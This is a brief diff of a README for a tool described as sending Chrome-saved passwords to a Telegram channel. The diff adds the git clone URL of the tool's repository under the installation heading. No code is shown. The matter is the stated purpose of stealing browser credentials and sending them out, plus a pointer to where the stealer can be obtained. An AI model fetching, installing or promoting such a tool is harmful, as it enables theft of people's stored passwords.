@@ -3,7 +3,7 @@ Send Chrome passwords to telegram channel
 
 ## Installation
 ```
-git clone 
+git clone https://github.com/abdurohman-karim/password_sender.git
 ```
 
 ## Installation Libraries
